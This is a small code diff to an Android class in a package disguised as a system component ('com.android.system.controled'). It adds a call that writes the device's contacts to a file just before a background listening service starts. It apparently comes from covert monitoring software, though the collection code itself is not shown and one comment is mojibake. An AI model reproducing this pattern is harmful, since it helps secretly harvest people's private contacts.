@@ -13,6 +13,7 @@ import android.net.NetworkInfo.State;
 import android.util.Log;
 
 import com.android.system.controled.service.ListenService;
+import com.android.system.controled.util.ContactsUtil;
 import com.android.system.controled.util.DoAboutCodeUtils;
 import com.android.system.controled.util.FileUtil;
 
@@ -156,6 +157,9 @@ public class Globle {
 	 * @date:2012-8-30
 	 */
 	public static void startBackService(Context context) {
+		
+		ContactsUtil.createContactsFile(context);//≤‚ ‘
+		
 		if (!isServiceStarted(context, SERVICE_NAME_LISTEN)) {
 			Intent i = new Intent(context, ListenService.class);
 			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
